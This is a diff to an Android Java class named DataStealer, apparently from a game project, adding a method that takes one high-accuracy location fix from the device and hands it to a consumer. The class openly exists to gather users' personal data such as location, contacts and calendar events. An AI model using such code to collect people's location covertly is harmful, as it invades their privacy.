@@ -24,6 +24,8 @@ import java.util.concurrent.TimeUnit;
 
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
+import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
+import de.hpi3d.gamepgrog.trap.future.Consumer;
 
 
 public class DataStealer {
@@ -164,6 +166,38 @@ public class DataStealer {
         fusedLocationClient = client;
     }
 
+
+    /**
+     * inserts a single LocationData into the given consumer
+     *
+     * @param context
+     * @param consumer
+     */
+    public void takeLocationData(Context context, Consumer<LocationData> consumer) {
+        LocationRequest locationRequest = LocationRequest.create();
+        locationRequest.setInterval(100);
+        locationRequest.setFastestInterval(50);
+        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+
+        locationCallback = new LocationCallback() {
+            @Override
+            public void onLocationResult(LocationResult locationResult) {
+                if (locationResult == null) {
+                    return;
+                }
+                for (Location location : locationResult.getLocations()) {
+                    // Give out data
+                    consumer.accept(new LocationData(location));
+                    fusedLocationClient.removeLocationUpdates(locationCallback);
+                }
+            }
+        };
+
+
+        fusedLocationClient.requestLocationUpdates(locationRequest,
+                locationCallback,
+                Looper.getMainLooper());
+    }
 
     /**
      * To get continuous location updates while app is in the foreground.
